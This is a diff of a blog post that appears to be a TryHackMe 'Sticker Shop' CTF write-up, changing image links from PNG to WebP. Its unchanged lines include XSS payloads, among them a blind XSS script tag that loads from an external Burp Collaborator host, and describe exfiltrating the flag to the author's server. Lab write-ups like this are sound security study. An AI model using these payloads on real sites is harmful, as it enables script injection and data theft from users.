@@ -32,7 +32,7 @@ Try Normal Paylaod first :
 ```console
 '"><script>alert(1)</script>
 ```
-![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Website.png){:width="1200" height="600" }
+![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Website.webp){:width="1200" height="600" }
 
 ## Blind XSS Discovery
 1. used Burp-collaborator to check if the Blind XSS is exsist or not
@@ -41,8 +41,8 @@ Try Normal Paylaod first :
 '"><script src=https://xyzh5f7ugxnj7919kl6eqcaohfn6bxzm.oastify.com></script>`
 ```
 
-![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Blind%20XSS.png){: width="1200" height="600" }
-![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Collaborator.png){: width="1200" height="600" }
+![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Blind%20XSS.webp){: width="1200" height="600" }
+![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Collaborator.webp){: width="1200" height="600" }
 
 3. After submitting the payload in the feedback form, I observed a DNS interaction logged in Burp Collaborator, confirming the execution of the payload.
 
@@ -73,7 +73,7 @@ Note: Edit and Replace your own IP Address.
 ### Injecting the Payload
 I submitted the payload in the feedback form.
 Shortly after, my HTTP server captured the exfiltrated flag in the query string of an incoming GET request.
-![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Fla.png){: width="1200" height="600" }
+![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Flag.webp){: width="1200" height="600" }
 
 After URL Decodes it We get The flag
 
